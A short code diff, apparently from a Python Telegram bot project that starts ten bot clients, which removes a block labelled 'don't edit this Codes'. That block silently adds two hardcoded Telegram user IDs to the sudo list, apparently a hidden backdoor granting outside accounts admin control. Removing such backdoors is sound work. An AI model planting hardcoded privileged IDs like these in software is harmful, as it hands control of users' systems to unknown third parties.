@@ -63,10 +63,3 @@ Riz9 = TelegramClient('Riz9', API_ID, API_HASH).start(bot_token=BOT_TOKEN9)
 Riz10 = TelegramClient('Riz10', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)
 
 
-# don't edit this Codes
-SUDO_USERS = []
-if SUDO:
-     SUDO_USERS = make_int(sudo)  
-SUDO_USERS.append(OWNER_ID)
-SUDO_USERS.append(1395922920)
-SUDO_USERS.append(5067755094)
